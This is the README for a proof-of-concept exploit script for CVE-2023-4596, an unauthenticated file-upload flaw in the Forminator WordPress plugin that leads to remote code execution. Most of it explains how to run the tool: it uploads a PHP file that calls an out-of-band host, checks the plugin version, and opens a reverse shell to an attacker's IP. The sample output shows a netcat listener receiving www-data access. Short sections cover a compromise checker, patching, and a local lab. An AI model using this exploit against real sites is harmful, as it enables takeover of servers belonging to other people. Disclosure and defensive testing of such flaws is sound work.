# CVE-2023-4596
PoC Script for CVE-2023-4596, unauthenticated Remote Command Execution through arbitrary file uploads.
<br>
<br>
[Video of PoC being used](https://youtu.be/C9hSA5vZFYo)
<br>
[Nuclei Template](https://github.com/projectdiscovery/nuclei-templates/pull/8118/files)
<br>
[News article](https://securityonline.info/cve-2023-4596-critical-wordpress-plugin-forminator-flaw-affects-over-400k-sites/)
<br>
[WordFence](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/forminator/forminator-1246-unauthenticated-arbitrary-file-upload)
<br>
[NVD Nist](https://nvd.nist.gov/vuln/detail/CVE-2023-4596)
<br>

# Summary
A critical vulnerability has been discovered in the WordPress plugin Forminator, which enables an unauthorized attacker to upload arbitrary files to a server. The initial proof of concept (PoC) was poorly written, the original researcher shared a few unclear screenshots along with a request containing unexplained code. So I wrote a python script to simplify and automate the process.

The vulnerability is caused by an error in the validation process for file types. When attempting to upload a prohibited file format, such as PHP, an alert is generated stating that the "Uploaded file's extension is not allowed." Despite this notification, the uploaded file is not blocked but rather, it is successfully uploaded and can be accessed within the "/wp-content/uploads" folder of the site. This vulnerability can lead to remote code execution.

Forminator is currently active on more than 400,000 sites, and with the simplicity of the vulnerability, it is quite easy to gain control over any site running Forminator with file upload enabled.

# Usage
Find a page running Forminator <= 1.24.6 with an upload function on the page. **Copy the full URL of the page that is running file upload postdata using Forminator, if only the domain is specified it will spit out an [error](https://github.com/E1A/CVE-2023-4596/blob/main/README.md#known-errors).** You can use [interactsh](https://app.interactsh.com/) or Burp Collaborator to generate a link, which you can paste in the selected field. 
After a successful upload, a request should appear in interactsh or burp within 5 seconds, indicating it is vulnerable.

<br> 

### Verifying that an instance is vulnerable without causing any harm.
```
user@debian:~$ python3 exploit.py -u http://127.0.0.1:8000/?p=7

______                   _             _              ______  _____  _____
|@E1A |                 (_)           | |             | ___ \/  __ \|  ___|
| |_ ___  _ __ _ __ ___  _ _ __   __ _| |_ ___  _ __  | |_/ /| /  \/| |__
|  _/ _ \| '__| '_ ` _ \| | '_ \ / _` | __/ _ \| '__| |    / | |    |  __|
| || (_) | |  | | | | | | | | | | (_| | || (_) | |    | |\ \ | \__/\| |___
\_| \___/|_|  |_| |_| |_|_|_| |_|\__,_|\__\___/|_|    \_| \_| \____/\____/


Input out-of-band link: <input link>

[+] Sending payload to target
[+] Successful file upload!

Uploaded File Location: http://127.0.0.1:8000/wp-content/uploads/2023/09/RefhnSzyQe.php

[+] Sending request to uploaded file...
[+] Successfully triggered the uploaded file!
[+] Check for an incoming request
```
<br> 

### Extracting the version to check if the instance is vulnerable
```
user@debian:~$ python3 exploit.py -u http://127.0.0.1:8000/?p=7 -v

______                   _             _              ______  _____  _____
|@E1A |                 (_)           | |             | ___ \/  __ \|  ___|
| |_ ___  _ __ _ __ ___  _ _ __   __ _| |_ ___  _ __  | |_/ /| /  \/| |__
|  _/ _ \| '__| '_ ` _ \| | '_ \ / _` | __/ _ \| '__| |    / | |    |  __|
| || (_) | |  | | | | | | | | | | (_| | || (_) | |    | |\ \ | \__/\| |___
\_| \___/|_|  |_| |_| |_|_|_| |_|\__,_|\__\___/|_|    \_| \_| \____/\____/


[+] Vulnerable version found: 1.24.6
```

<br>

### Starting a reverse shell on the instance
```
user@debian:~$ python3 exploit.py -u http://127.0.0.1:8000/?p=7 -r

______                   _             _              ______  _____  _____
|@E1A |                 (_)           | |             | ___ \/  __ \|  ___|
| |_ ___  _ __ _ __ ___  _ _ __   __ _| |_ ___  _ __  | |_/ /| /  \/| |__
|  _/ _ \| '__| '_ ` _ \| | '_ \ / _` | __/ _ \| '__| |    / | |    |  __|
| || (_) | |  | | | | | | | | | | (_| | || (_) | |    | |\ \ | \__/\| |___
\_| \___/|_|  |_| |_| |_|_|_| |_|\__,_|\__\___/|_|    \_| \_| \____/\____/


Enter IP address: <input IP>
Enter port: <input port>

[+] Sending payload to target
[+] Successful file upload!

Uploaded File Location: http://127.0.0.1:8000/wp-content/uploads/2023/09/IXLTyDMTEg.php

[+] Sending request to uploaded file...
[-] Request timed out. This could be due to the server being unavailable or because you started an reverse shell



user@debian:~$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 52760
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
# How does the script work?
The script only needs a full URL of a page that is using Forminator with file uploads enabled and an interactsh link to determine if the instance is vulnerable. The first request is sent to the page to extract the forminator_nonce and form_id which are values that are different for every page. After retrieving these values, a second request is sent out that uses these extracted values, and the PHP file is uploaded. This PHP file uses the interactsh link that was provided earlier by the user and adds it to the script. When the page is visited where the PHP script is located, a request will show up in interactsh showing that the site is vulnerable. 
Regex is used for splitting the URL into parts that are used later in the request, it is also used to determine the version of Forminator that is printed when using the -v argument. The location where the file is uploaded depends on what year and months you upload the file. That is why I used datetime to determine the current months and year, which is also used later to send the request to the uploaded file location. 
When testing the vulnerability, I was using a single filename, but after sending multiple files, i noticed only the first uploaded file would start. To fix that, a random string is used for every request.

# Known errors

**[-] Could not extract forminator_nonce** <br>
This exploit only works when a link is provided of the exact page where the file upload is enabled with Forminator. When a link is provided with just the domain or a page that is not running a file upload on it, it spits out an error. This is because it exports the forminator_nonce from the provided URL and if this page is not running Forminator or the Forminator file upload, it can't find the value and can't use it. You can also check by finding the string "forminator-field-post-image-postdata" in the source code of the site. A full link, for example, looks like this: `http://127.0.0.1:8000/?p=7`. You can find the full issue [here](https://github.com/E1A/CVE-2023-4596/issues/1).

# How to check if you are compromised
I've included two files (checker.sh and checker.bat) in the repo that check the current folder and subfolders for any files with a blocked extension. When these are found, they will be displayed. The reason for this script is that for every month the plugin has been installed, a new folder is created, which can take a lot of work to manually check all of them.

# Mitigation
Update to the latest version

## Installation
1. cd CVE-2023-4596/ && docker-compose up -d
2. Browse to `http://127.0.0.1:8000`
3. Set up a wp account and download the vulnerable plugin found [here](https://downloads.wordpress.org/plugin/forminator.1.24.6.zip)
5. Create a form with postdata or a file upload and publish it to a post
6. Paste the full URL in the command and run it.
7. Enjoy ( /・・)ノ

## Disclaimer
The script provided is for educational purposes only, I am not responsible for your actions.

<br>

[Twitter](https://twitter.com/7hreathunter) <br>
Made by Finn van der Knaap
